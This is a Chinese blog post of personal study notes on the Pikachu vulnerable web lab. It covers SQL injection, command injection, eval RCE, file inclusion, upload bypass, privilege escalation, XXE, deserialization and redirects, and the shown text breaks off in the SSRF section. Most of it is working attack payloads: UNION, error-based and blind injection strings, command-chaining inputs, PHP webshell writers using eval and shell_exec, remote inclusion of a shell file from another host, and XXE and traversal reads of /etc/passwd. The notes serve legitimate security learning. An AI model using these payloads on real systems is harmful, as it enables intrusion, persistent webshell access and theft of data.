---
title: pikachu靶场
date: 2022-07-13 23:18:31
categories: 渗透测试
tags: 靶场
---

最近考试在即，对pikachu靶场的部分漏洞又做了一遍，相当于复习一下常规漏洞，由于图片较多，也懒得重新部署到图床上了，所以没有图片，看起来比较粗糙。

<!--more-->

# SQL注入

## 数字型注入

后端sql查询语句为

`$query="select username,email from member where id=$id";`

id=1 and 1=1  回显正常

id=1 and 1=2 回显错误，存在注入

id=1 order by 2 回显正常存在2个字段

`id=1 union select 1,2`

id=1 union select 1,database() // Pikachu

`id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`// 查表

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220614214800-agxsjbt.png)

`id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'`// 查列

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220614215128-5iaolvm.png)

`id=1 union select 1,group_concat(username,":",password) from users`


`id=1 union select 1,count(*) from users`// 猜记录数量


## 字符型注入

后端sql查询语句为

`$query="select id,email from member where username='$name'";`


`vince'+and+'a'%3d'a`// 正常回显 实则=vince' and 'a'='a,url编码输入

`vince'+and+'a'%3d'a` // 提示username不存在，存在注入

`name=vince'+order+by+2%23`// 存在2个字段

`name=vince'+union+select+1,2%23`

`name=vince'+union+select+1,database()%23`// 数据库pikachu

`name=vince'+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23`// 表名

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220614221914-2afekm5.png)

`name=vince'+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name%3d'member'%23`// 猜列名

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220614222149-1eayfvw.png)

`name=vince'+union+select+1,group_concat(username,':',pw)+from+member%23`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220614222445-8wn5ih1.png)

`name=vince'+union+select+1,count(*)+from+member%2`// 记录数

## 搜索型注入

所执行的sql语句为

`$query="select username,id,email from member where username like '%$name%'";`


`name=allen'+order+by+3%23`// 猜测数据列数，这里必须保证数据库真的有allen这个用户名，否则无法成功

`name=allen'+union+select+1,2,3%23` 

`name=allen'+union+select+1,2,database()%23`

`name=allen'+union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23`

`name=allen'+union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name%3d'users'%23`

`name=allen'+union+select+1,2,group_concat(username,':',password)+from+users%23`

`?name=allen'+union+select+1,2,length(group_concat(username,':',password))+from+users%23`// 猜测用户密码总长度，可用于盲注

## xx型注入

sql查询语句为

`$query="select id,email from member where username=('$name')";`

所以需要闭合掉括号

`name=vince')+order+by+2%23`// 前提是name的值vince要存在

`name=vince')+union+select+1,2%23`

`name=vince')+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23`

`vince')+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name%3d'message'%23`



## insert/update注入

update语句

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220615221158-ris7m3i.png)

insert语句

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220615221305-28h70pk.png)

updatexml函数

第一个参数:XML_document是String格式，为XML文档对象的名称，文中为Doc  
第二个参数:XPath_string (Xpath格式的字符串)，如果不了解Xpath语法，可以在网上查找教程。第三个参数:new_value，String格式，替换查找到的符合条件的数据


username=`1'+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)+and+'`

这种insert注入个人理解如果你在前几个字段插入注入语句是不能通过#、--+等一系列闭合，这样会破坏后面的语句

除非你将注入语句放到最后一个字段，再用 **)** 将其闭合形成完整语句

`username=a&password=a&sex=a&phonenum=a&email=a&add=1'+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1))%23&submit=submit`

猜表

`username=1'+and+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)+and+'&password=a&sex=a&phonenum=a&email=a&add=1&submit=submit`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220616110635-4fs4xj5.png)

`1'+and+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_name%3d'user'),0x7e),1)+and+'&password=a&sex=a&phonenum=a&email=a&add=1&submit=submit` 

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220616110952-64ij0fe.png)

可以看到使用updatexml显示结果长度有限,使用limit控制条数

`username=1'+and+updatexml(1,concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name%3d'users'+limit+0,1),0x7e),1)+and+'&password=a&sex=a&phonenum=a&email=a&add=1&submit=submit`


extractvalue函数  
extractvalue函数:对XML文档进行查询的函数其实就是相当于我们熟悉的HTML文件中用<div><p><a>标签查找元素一样语法: extractvalue(目标xml文档,xml路径)第二个参数xml中的位置是可操作的地方，xml文档中查找字符位置是用/xx/xxx/xoox ...这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容

username=1'+and+extractvalue(1,concat(0x7e,(select+database()),0x7e))+and+'&password=a&sex=a&phonenum=a&email=a&add=1&submit=submit

```sql
username=1'+and+extractvalue(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e))+and+'&password=a&sex=a&phonenum=a&email=a&add=1&submit=submit
```

**update型注入**

和insert一样，只要闭合正确就ok

`sex=1'+and+extractvalue(1,concat(0x7e,(select+database()),0x7e))+and+'&phonenum=a&add=a&email=a&submit=submit`

```sql
sex=1'+and+extractvalue(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),0x7e))+and+'&phonenum=a&add=a&email=a&submit=submit
```


## delete型

删除语句，没对id进行处理

`$query="delete from message where id={$_GET['id']}";`

尝试删除留言,留言为id参数，加'报错，使用报错注入

`id=56+and+extractvalue(1,concat(0x7e,(select+database()),0x7e))`

```sql
id=56+and+extractvalue(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e))
```

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220620212459-r9xmzqf.png)

extractvalue无法显示全，使用limit


```sql
id=56+and+extractvalue(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),0x7e))

id=56+and+extractvalue(1,concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name%3d'users'+limit+0,1),0x7e))

id=56+and+extractvalue(1,concat(0x7e,(select+username+from+users+limit+0,1),0x7e))
```

或者使用updatexml函数

```sql
id=56+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)

id=56+and+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)
```


## header头注入

关键代码

```php
//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$userage
nt','$httpaccept','$remoteport')";
$result=execute($link, $query);
```

其实也属于insert注入，在cookie和user-agent插入但引号都会导致其报错，使用报错注入

这里有个疑问，将空格url编码为+反而不行，难道是插入语句没有使用**{}**?

```sql
a' and extractvalue(1,concat(0x7c,(select database()),0x7c)) and '

User-Agent: 1' and extractvalue(1,concat(0x7c,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7c)) and ' // 这里使用字符a不行，要使用数字比如1才行，十分懵逼
```

或者updatexml

```sql
User-Agent: 1' and updatexml(1,concat(0x7c,(select database()),0x7c),1) and ' 

1' and updatexml(1,concat(0x7c,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7c),1) and '// 同样使用字符不行，得用数字。
```

## 盲注

核心代码

```sql
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

语句执行成功会返回id和邮箱，否则会提示username不存在

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220621222140-083waey.png)

`vince'+and+length(database())>%3d7%23` // 判断数据库长度，为7位

`?name=vince'+and+substr(database(),1,1)%3d'p'%23`// 猜数据库名

可以使用burpsuite配合ascii函数爆破33-127位ascii的可见字符

```sql
vince'+and+ascii(substr(database(),1,1))%3d112%23
```

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220621222957-kyd3y2u.png)

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220621224746-j8x2ufb.png)

```sql
name=vince'+and+length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()))%3d1%23 //猜表长度

name=vince'+and+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),1,1))%3d112%23 //猜表名
```



## 时间瞒注

关键代码

```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{

        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}
```

从代码可以看出，无论对与错都只会输出`i don't care who you are!`

`name=vince'+and+if(length(database())>1,sleep(5),1)%23`// 如果数据库长度大于1，会延迟5秒返回结果，前提是数据库必须有vince这个用户才行，不然无法查询成功。

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220628210418-mawqopg.png)

`name=vince'+and+if(substr(database(),1,1)%3d'p',sleep(5),1)%23`// 猜数据库名

或者使用ascii,配合bp的爆破模块，结合logger++插件来进行时间瞒注，这方法不太准，大量请求可能消耗服务器资源影响响应速度

`?name=vince'+and+if(ascii(substr(database(),2,1))%3d106,sleep(2),1)%2`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220628215855-p3omjnn.png)

```sql
?name=vince'+and+if(ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),1,1))%3d104,sleep(5),1)%23 //猜表命
```


## 宽字节注入

核心代码

```sql
if(isset($_POST['submit']) && $_POST['name']!=null){

    $name = escape($link,$_POST['name']);
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";
    execute($link,$set);

    //mysqi_query不打印错误描述
    $result=mysqli_query($link, $query);
    if(mysqli_num_rows($result) >= 1){
        while ($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }


}
```

`name=1%df' or 1=1#`

`name=kobe%df' union select 1,2#`

```sql
name=kobe%df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#

由于使用宽字节注入无法使用单引号，可使用嵌套sql语句
name=kobe%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1)) #
```

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220628230004-t7l6fnh.png)


# rce

## ping


核心代码

```http
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
//         var_dump(php_uname('s'));
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }

}
```

`127.0.0.1&whoami`

`127.0.0.1||whoami`

`127.0.0.1|whoami`

或者绕waf

`127.0.0.1&wh\oami`

`127.0.0.1 & ca\t ../?ey.?hp`

## eval

核心代码

```php
$html='';
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";

    }

}
```

eval可直接执行php代码

`phpinfo();`

当然也能使用system函数执行命令，要考虑闭合

```php
{{system('id')}}

;?><?php system('id');

```

一个eval函数的ctf题

```php
 <?php
error_reporting(0);
include "key4.php";
$a=$_GET['a'];
eval("\$o=strtolower(\"$a\");");
echo $o;
show_source(__FILE__); 
```

解题

```php
a=${${system('cat ./key4.php')}}

a=");system('id');//
```

# 文件包含

## 本地文件包含

关键代码

```php
$html='';
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
//     //安全的写法,使用白名单，严格指定包含的文件名
//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php'){
//         include "include/$filename";

//     }
}
```

文件包含常见利用方式

```php
file直接读文件
?file=file:///etc/passwd
?file=file://D:/soft/phpstudy/www/1.txt

php://filter
?file=php://filter/read=convert.base64-encode/resource=./index.php  //base64读文件
php://filter/read=convert.base64-encode/resource=../../../../../../../etc/passwd

php://input
[post data] <?php phpinfo();?> <?php system('id');?>
<?php fputs(fopen('shell.php','w'),'<?php $var=shell_exec($_GET["cmd"]); echo $var ?>');?> \\写文件参考

data://text
?file=data://text/plain,<?php phpinfo();?>
file=data:text/plain,<?php echo shell_exec("dir") ?>
?file=data://text/plain,<?php system('find / -name key.php');?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

目录浏览

`filename=../../../../../../../../../etc/passwd`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220629225040-9sl3tnv.png)

但它只包含include下的文件，貌似无法使用绝对路径和伪协议了


## 远程文件包含

远程文件包含需要php.ini打开如下配置

`allow_url_include=on`

关键代码

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "$filename";//变量传进来直接包含,没做任何的安全限制
```

从代码可以看出，get传进来直接包含,这里除了可以远程文件包含，还可以使用伪协议

直接使用绝对路径读取文件

`?filename=/etc/passwd`

* 使用php://filter

`filename=php://filter/read=convert.base64-encode/resource=/etc/passwd`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630204848-4oyng4z.png)

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630204923-6tzbrkz.png)

* 使用data://text

`?file=data://text/plain,<?php phpinfo();?>`

执行失败使用url编码

`data://text/plain,<%3fphp+phpinfo()%3b%3f>`

直接使用system函数执行命令

`data://text/plain,<%3fphp+system('id')%3b%3f>`

`data://text/plain,<?php system('id');?>`

shell_exec函数

`data%3atext/plain,<%3fphp+echo+shell_exec("dir")+%3f>`

`data:text/plain,<?php echo shell_exec("dir") ?>`

若遇到一些过滤使用base64编码

`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`

这里执行失败，url编码所有字符可执行成功

写入文件，将以下木马url编码后即可写入成功

```php
<?php fputs(fopen('shell.php','w'),'<?php $var=shell_exec($_GET["cmd"]); echo $var ?>');?>
```

`data%3a//text/plain,<%3fphp+fputs(fopen('shell.php','w'),'<%3fphp+$var%3dshell_exec($_GET["cmd"])%3b+echo+$var+%3f>')%3b%3f>`

或者写入一句话木马,报错就url编码

```php
data://text/plain,<?php fputs(fopen('shell.php','w'),'<?php eval($_POST["cmd"]);?>');?>
```

* php://input

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630223426-7wlwgit.png)

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630223518-kdt435n.png)

或者写webshell

```php
<?php fputs(fopen('shell.php','w'),'<?php eval($_POST["cmd"]);?>');?>
```

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630223836-0aw0jvq.png)

或者也可以这么写

```php
<?php
$file = fopen("shell.php","w");
$text = '<?php eval($_POST["cmd"]);?>';
fwrite($file,$text);
fclose($file);
?>
```

* 远程文件包含

在远程服务器新建shell.txt，写入一句话木马,启动web服务

```php
<?php eval($_POST["cmd"]);?>
```

蚁剑直接连

```php
http://192.168.1.7:8000/vul/fileinclude/fi_remote.php?filename=http://192.168.1.7:8080/shell.txt&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220630225354-m1o4gkb.png)

可执行任何php代码，上线msf也可以


# 任意文件下载

部分代码

```php
<?php


$PIKA_ROOT_DIR =  "../../";

include_once $PIKA_ROOT_DIR."inc/function.php";

header("Content-type:text/html;charset=utf-8");
// $file_name="cookie.jpg";
$file_path="download/{$_GET['filename']}";
//用以解决中文不能显示出来的问题
$file_path=iconv("utf-8","gb2312",$file_path);

//首先要判断给定的文件存在与否
if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return ;
}
$fp=fopen($file_path,"rb");
$file_size=filesize($file_path);
//下载文件需要用到的头
ob_clean();//输出前一定要clean一下，否则图片打不开
Header("Content-type: application/octet-stream");
Header("Accept-Ranges: bytes");
Header("Accept-Length:".$file_size);
Header("Content-Disposition: attachment; filename=".basename($file_path));
$buffer=1024;
$file_count=0;
//向浏览器返回数据

//循环读取文件流,然后返回到浏览器feof确认是否到EOF
while(!feof($fp) && $file_count<$file_size){

    $file_con=fread($fp,$buffer);
    $file_count+=$buffer;

    echo $file_con;
}
fclose($fp);
?>
```

未对下载文件做过滤限制，可下载敏感文件

`?filename=../../../../../etc/passwd`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220703142415-vazw6eh.png)

`filename=../../../../../root/.bash_history` //这里无法下载这个文件，怀疑是没有权限

# 任意文件上传

## client check

关键代码

```php
<script>
    function checkFileExt(filename)
    {
        var flag = false; //状态
        var arr = ["jpg","png","gif"];
        //取出上传文件的扩展名
        var index = filename.lastIndexOf(".");
        var ext = filename.substr(index+1);
        //比较
        for(var i=0;i<arr.length;i++)
        {
            if(ext == arr[i])
            {
                flag = true; //一旦找到合适的，立即退出循环
                break;
            }
        }
        //条件判断
        if(!flag)
        {
            alert("上传的文件不符合要求，请重新选择！");
            location.reload(true);
        }
    }
</script>
```

只在前端效验文件后缀，绕过方法很简单，将一句话木马后缀修改为jpg后缀，提交用bp抓包再将后缀修改为php，或者禁用或删除相关js代码即可绕过

## MIME TYPE

关键代码

```php
if(isset($_POST['submit'])){
//     var_dump($_FILES);
    $mime=array('image/jpg','image/jpeg','image/png');//指定MIME类型,这里只是对MIME类型做了判断。
    $save_path='uploads';//指定在当前目录建立一个目录
    $upload=upload_sick('uploadfile',$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['new_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";
    }
}
```

修改`Content-Type: image/jpeg` 即可

## getimagesize

```php
if(isset($_POST['submit'])){
    $type=array('jpg','jpeg','png');//指定类型
    $mime=array('image/jpg','image/jpeg','image/png');
    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";

    }
}
```

已经采用白名单指定了文件后缀，只能制作图片马，结合文件包含加以利用

`copy 1.png/b+1.php/a shell.png`

中国蚁剑连接

`http://192.168.1.108/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/06/01/5378955e8473f39896e235759676.png&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`

# 越权

## 水平越权

关键代码

```php
if(isset($_GET['submit']) && $_GET['username']!=null){
    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
    $username=escape($link, $_GET['username']);
    $query="select * from member where username='$username'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)==1){
        $data=mysqli_fetch_assoc($result);
        $uname=$data['username'];
        $sex=$data['sex'];
        $phonenum=$data['phonenum'];
        $add=$data['address'];
        $email=$data['email'];

        $html.=<<<A
<div id="per_info">
   <h1 class="per_title">hello,{$uname},你的具体信息如下：</h1>
   <p class="per_name">姓名:{$uname}</p>
   <p class="per_sex">性别:{$sex}</p>
   <p class="per_phone">手机:{$phonenum}</p>
   <p class="per_add">住址:{$add}</p>
   <p class="per_email">邮箱:{$email}</p>
</div>
A;
    }
}
```

只通过username来输出要查询的身份信息

`op1_mem.php?username=lucy`

只需将lucy更改为其他人的名字，就能查询他人信息

`op1_mem.php?username=kobe`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220704205940-vls0gvl.png)

## 垂直越权

关键代码

`op2_login.php`

```php
if(mysqli_num_rows($result)==1){
            $data=mysqli_fetch_assoc($result);
            if($data['level']==1){//如果级别是1，进入admin.php
                $_SESSION['op2']['username']=$username;
                $_SESSION['op2']['password']=sha1(md5($password));
                $_SESSION['op2']['level']=1;
                header("location:op2_admin.php");
            }
            if($data['level']==2){//如果级别是2，进入user.php
                $_SESSION['op2']['username']=$username;
                $_SESSION['op2']['password']=sha1(md5($password));
                $_SESSION['op2']['level']=2;
                header("location:op2_user.php");
            }
```

`op2_admin.php`

```php
// 判断是否登录，没有登录不能访问
//如果没登录，或者level不等于1，都就干掉
if(!check_op2_login($link) || $_SESSION['op2']['level']!=1){
    header("location:op2_login.php");
    exit();
}

```

`op2_admin_edit.php`

```php
// 判断是否登录，没有登录不能访问
//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
if(!check_op2_login($link)){
    header("location:op2_login.php");
    exit();
```

使用管理员账号admin登陆，创建用户并抓包

然后退出管理员账户，使用普通账户pikachu登陆并获取其cookie

将普通用户的cookie替换为admin的cookie

也就是用普通用户pikachu的cookie完成了admin才能完成的操作

# 目录遍历

**介绍**

> 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。  
>  看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。  
>  需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在"i can see you ABC"中了解更多）  
>  你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。

关键代码

```php
$html='';
if(isset($_GET['title'])){
    $filename=$_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";
//    echo $html;
}
```

`http://127.0.0.1:8000/vul/dir/dir_list.php?title=../../../../etc/passwd`

![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220704215855-0wufzf3.png)

# 敏感信息泄露

1. 注释泄露账户密码

   ![image.png](C:\Users\Lenovo\AppData\Local\Temp\Temp1_皮卡丘.zip\皮卡丘\WEB\靶机笔记\assets\image-20220704220539-pv3ag7f.png)

2. 直接访问abc.php可成功访问，无需效验cookie即可查看

3. http响应他泄露中间件、版本、操作系统信息


# 反序列化

 引用自 [反序列化](http://blog.csdn.net/qq_53079406/article/details/124227179?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-124227179-blog-109373942.pc_relevant_multi_platform_whitelistv2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-124227179-blog-109373942.pc_relevant_multi_platform_whitelistv2&utm_relevant_index=1)

>序列化就是将数据转化成一种可逆的字符串，字符串还原原来结构的过程叫做[反序列化](http://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)
>
>序列化后，方便保存和传输（保留成员变量，不保留函数方法）
>
>数据（对象）--------序列化---------->字符串-----------反序列化-------->数据（对象）

```php
class S{
        public $test="pikachu";
    }
    $s=new S(); //创建一个对象
    serialize($s); //把这个对象进行序列化
    序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
        O:代表object
        1:代表对象名字长度为一个字符
        S:对象的名称
        1:代表对象里面有一个变量
        s:数据类型
        4:变量名称的长度
        test:变量名称
        s:数据类型
        7:变量值的长度
        pikachu:变量值
```

再来看源代码

```php
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;
    }
}


//O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
$html='';
if(isset($_POST['o']
)){
    $s = $_POST['o'];
    if(!@$unser = unserialize($s)){
        $html.="<p>大兄弟,来点劲爆点儿的!</p>";
    }else{
        $html.="<p>{$unser->test}</p>";
    }

}
```

o是可控的，反序列化成功会执行

先进行一个序列化

```php
<?php
class S{
	var $test = "<script>alert('xss')</script>";
}

$a = new S();
echo serialize($a);
?>
```

得到`O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`

# xxe

代码

```bat
if(isset($_POST['submit']) and $_POST['xml'] != null){


    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

任意文件读取payload

```bat
<?xml version="1.0"  encoding="UTF-8"?>
<!DOCTYPE name [
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<name>&xxe;</name>
```

使用伪协议

```bat
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
]>
<x>&f;</x>
```

# url重定向

```bat
$html="";
if(isset($_GET['url']) && $_GET['url'] != null){
    $url = $_GET['url'];
    if($url == 'i'){
        $html.="<p>好的,希望你能坚持做你自己!</p>";
    }else {
        header("location:{$url}");
    }
}
```

直接抓包修改url参数

`/vul/urlredirect/urlredirect.php?url=http://www.baidu.com`

# SSRF

## curl

代码

```php
if(isset($_GET['url']) && $_GET['url'] != null){

    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
